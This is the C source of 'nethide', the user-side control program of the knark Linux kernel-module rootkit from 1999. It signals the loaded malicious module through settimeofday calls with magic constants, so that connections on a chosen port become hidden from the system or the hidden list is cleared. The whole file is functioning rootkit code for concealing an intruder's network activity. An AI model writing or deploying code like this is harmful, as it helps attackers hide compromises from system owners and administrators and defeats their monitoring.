/*
 * nethide.c, part of the knark package
 * Linux 2.1-2.2 lkm trojan user program
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * 
 * This program may NOT be used in an illegal way,
 * or to cause damage of any kind.
 * 
 * See README for more info.
 */

#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdio.h>
#include "knark.h"


void usage(const char *progname)
{
    fprintf(stderr,
	    "Usage:\n"
	    "\t%s <string>\n"
            "\t%s -c (clear nethide-list)\n"
	    "ex: %s \":ABCD\" (will hide connections to/from port 0xABCD)\n",
	    progname, progname, progname);
    exit(-1);
}


int main(int argc, char *argv[])
{
    char *hidestr;
    
    author_banner("nethide.c");
    
    if(argc != 2 || !strlen(argv[1]))
	usage(argv[0]);
    
    if(!strcmp(argv[1], "-c"))
    {
	if(settimeofday((struct timeval *)KNARK_CLEAR_NETHIDES,
			(struct timezone *)NULL) == -1)
	{
	    perror("settimeofday");
	    fprintf(stderr, "Have you really loaded knark.o?!\n");
	    exit(-1);
	}
	printf("Done. Nethide list cleared.\n");
	exit(0);
    }
    
    hidestr = argv[1];
    
    if(settimeofday((struct timeval *)KNARK_ADD_NETHIDE,
		    (struct timezone *)hidestr) == -1)
    {
	perror("settimeofday");
	fprintf(stderr, "Have you really loaded knark.o?!\n");
	exit(-1);
    }
    
    printf("Done: \"%s\" is now removed\n", hidestr);
    exit(0);
}

